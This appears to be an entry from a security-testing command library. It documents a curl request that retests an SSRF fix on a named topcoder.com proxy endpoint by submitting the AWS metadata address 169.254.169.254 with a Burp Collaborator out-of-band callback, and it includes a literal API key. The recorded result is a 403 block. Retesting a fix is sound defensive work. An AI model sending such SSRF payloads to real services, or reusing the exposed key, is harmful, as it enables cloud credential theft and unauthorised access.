---
id: cmd-uuid-2
data: >-
  curl -X POST
  "https://cognitive.topcoder.com/community-app-assets/api/proxy-post" -H
  "Authorization: ApiKey 130edef6-2289-4407-bfcf-3eedacebb860" -H "Content-Type:
  application/x-www-form-urlencoded" -d
  "url=http%3A%2F%2F169.254.169.254&EMAIL=eviltwin%404w15ul5vh79meeab3xqz2jk45vbpze.burpcollaborator.net"
tags:
  - ssrf
  - testing
type: command
output: |-
  HTTP/1.1 403 Forbidden
  <html>Access denied</html>
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:08:46.117Z'
verified: false
validated: true
submitted: true
---
# test-ssrf-fix-metadata-access

## Command

```bash
curl -X POST "https://cognitive.topcoder.com/community-app-assets/api/proxy-post" \
  -H "Authorization: ApiKey 130edef6-2289-4407-bfcf-3eedacebb860" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=http%3A%2F%2F169.254.169.254&EMAIL=eviltwin%404w15ul5vh79meeab3xqz2jk45vbpze.burpcollaborator.net"
```

## Description

This command tests a post-fix SSRF vulnerability by requesting the base AWS metadata endpoint, expecting a block if the fix is effective.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | POST method | Yes |
| `url=...` | Encoded internal IP | Yes |
| `EMAIL=...` | OOB domain | No |
| `Authorization` | API key | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://target/api/proxy" -H "Authorization: ApiKey KEY" -d "url=http%3A%2F%2F169.254.169.254"
```

### Advanced Usage

With OOB:

```bash
curl -X POST "https://target/api/proxy" -H "Authorization: ApiKey KEY" -d "url=ENCODED_IP&EMAIL=callback@oob.net"
```

## Expected Output

HTTP/1.1 403 Forbidden with body indicating access denied.

## Related

- [[Related Procedure|procedures/Test-SSRF-Fix-Effectiveness-with-Metadata-Request]]
